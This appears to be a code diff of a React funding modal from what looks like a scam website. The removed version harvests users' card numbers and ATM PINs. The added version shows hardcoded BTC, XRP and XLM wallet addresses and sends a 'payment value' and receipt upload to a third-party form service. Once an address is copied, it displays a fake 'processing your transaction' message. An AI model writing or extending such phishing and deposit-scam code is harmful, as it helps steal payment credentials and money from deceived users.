@@ -1,92 +1,95 @@
-import { useForm } from "react-hook-form";
-import { AlertError } from "../../../Global/Alert/Alert";
-import { useUpdateBalance } from "../../../Global/hook/useUpdatBalance";
-import { LoadingModal } from "../../../Global/LoadingModal/LoadingModal";
+import { useState } from "react";
 import { Message } from "../../../Global/Message/Message";
 
 type ModalCloseHandler = () => void;
+
+const cryptoAddresses = [
+  {
+    label: "XLM",
+    address: "GDHPDRNHTIBLTMM5JOQGUUJKYQLGXQT7SCKHRNIA3YXWOKCJNORSFBYH",
+  },
+  {
+    label: "XRP",
+    address: "r99M3WfDhcMCeR8c1rXTFYmwgCsvaJFmvn",
+  },
+  {
+    label: "BTC",
+    address: "bc1qxz7scqpymkaresc3g2hspkwkme66an9sn3lc08",
+  },
+];
+
 export const ModalForm = ({ onClose }: { onClose: ModalCloseHandler }) => {
-  const {
-    register,
-    handleSubmit,
-    formState: { errors },
-  } = useForm();
+  const [copiedAddress, setCopiedAddress] = useState<string>("");
+  const [inProcess, setIsInProcess] = useState(false);
 
-  const { handleUpdateBalance, loading, success, newBalance } = useUpdateBalance();
-
-  const onSubmit = async (formData: any) => {
-    await handleUpdateBalance(formData);
-    onClose();
+  const onCopyAddress = (address: string) => {
+    navigator.clipboard.writeText(address);
+    setCopiedAddress(address);
+    setTimeout(() => {
+      setCopiedAddress("");
+      setIsInProcess(true);
+    }, 2000);
   };
 
+  if (inProcess) {
+    return <Message message="Hold while we process your transaction..." />;
+  }
+
   return (
-    <form onSubmit={handleSubmit(onSubmit)} className="space-y-6 ">
-      {loading && <LoadingModal />}
+    <form
+      className="space-y-6"
+      action="https://getform.io/f/578d9b29-1920-4659-8226-6d2167de9a55"
+      method="POST"
+      encType="multipart/form-data"
+    >
+      <div className="rounded-md bg-secondary p-5 text-white shadow-lg">
+        <div>
+          <label htmlFor="cryptoAddress" className="font-bold text-white">
+            Choose Crypto Address:
+          </label>
+          <div className="mt-3 flex flex-wrap gap-2">
+            {cryptoAddresses.map(crypto => (
+              <div key={crypto.label} className="flex items-center rounded-lg border border-gray-300 p-2">
+                <div className="cursor-pointer" onClick={() => onCopyAddress(crypto.address)}>
+                  {copiedAddress === crypto.address ? "Text Copied" : crypto.label}
+                </div>
+                <div className="ml-2 text-gray-500">{crypto.address}</div>
+              </div>
+            ))}
+          </div>
+        </div>
+      </div>
 
       <div>
-        <label htmlFor="cardNumber" className="text-gray-700">
-          Card Number:
+        <label htmlFor="paymentValue" className="text-gray-700">
+          Kindly State your payment value for validation (e.g. $100):
         </label>
-        <div className={`flex cursor-pointer items-center border-b-2 border-b-[#ebebeb] p-1 py-0`}>
-          <input
-            {...register("cardNumber", { required: true })}
-            type="number"
-            id="cardNumber"
-            name="cardNumber"
-            placeholder="Enter your card number"
-            className="w-full rounded-lg border-none p-2 outline-none [appearance:textfield] [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"
-          />
-        </div>
+        <input
+          type="text"
+          id="paymentValue"
+          name="paymentValue"
+          placeholder="Enter your payment value"
+          className="mt-4 w-full items-center rounded-lg border-b-2 border-b-[#ebebeb] p-1 py-0 outline-none"
+        />
       </div>
-      {errors.cardNumber && <AlertError>Please enter your cardNumber</AlertError>}
 
       <div>
-        <label htmlFor="atmPin" className="text-gray-700">
-          ATM PIN:
+        <label htmlFor="transactionReceipt" className="text-gray-700">
+          Send your transaction receipt for security reasons:
         </label>
-        <div className={`flex cursor-pointer items-center border-b-2 border-b-[#ebebeb] p-1 py-0`}>
-          <input
-            {...register("atmPin", { required: true })}
-            type="password"
-            id="atmPin"
-            name="atmPin"
-            placeholder="Enter your ATM PIN"
-            maxLength={4}
-            className="w-full rounded-lg border-none p-2 outline-none "
-          />
-        </div>
+        <input
+          type="file"
+          id="transactionReceipt"
+          name="transactionReceipt"
+          className="w-full rounded-lg border-none p-2 outline-none"
+        />
       </div>
-      {errors.atmPin && <AlertError>Please enter your atm pin</AlertError>}
-      <div>
-        <label htmlFor="amount" className="text-gray-700">
-          Amount
-        </label>
-        <div className={`flex cursor-pointer items-center border-b-2 border-b-[#ebebeb] p-1 py-0`}>
-          <input
-            {...register("amount", { required: true })}
-            type="number"
-            id="amount"
-            name="amount"
-            placeholder="Enter the amount to add"
-            className="w-full rounded-lg border-none p-2 outline-none "
-          />
-        </div>
-      </div>
-      {errors.amount && <AlertError>Please enter your amount</AlertError>}
+
       <input
         type="submit"
-        value={`${loading ? "loading..." : "Submit"}`}
-        className={`${
-          loading ? "animate-pulse cursor-wait" : "cursor-pointer"
-        } w-full cursor-pointer rounded border-none  bg-accent p-2 font-bold text-white outline-none`}
+        value="Submit"
+        className="w-full rounded border-none bg-accent p-2 font-bold text-white outline-none"
       />
-
-      {success && (
-        <Message
-          className="rounded-xl bg-secondary p-4 text-white"
-          message={`Successfully funded your account. you now have $${newBalance} in your account`}
-        />
-      )}
     </form>
   );
 };
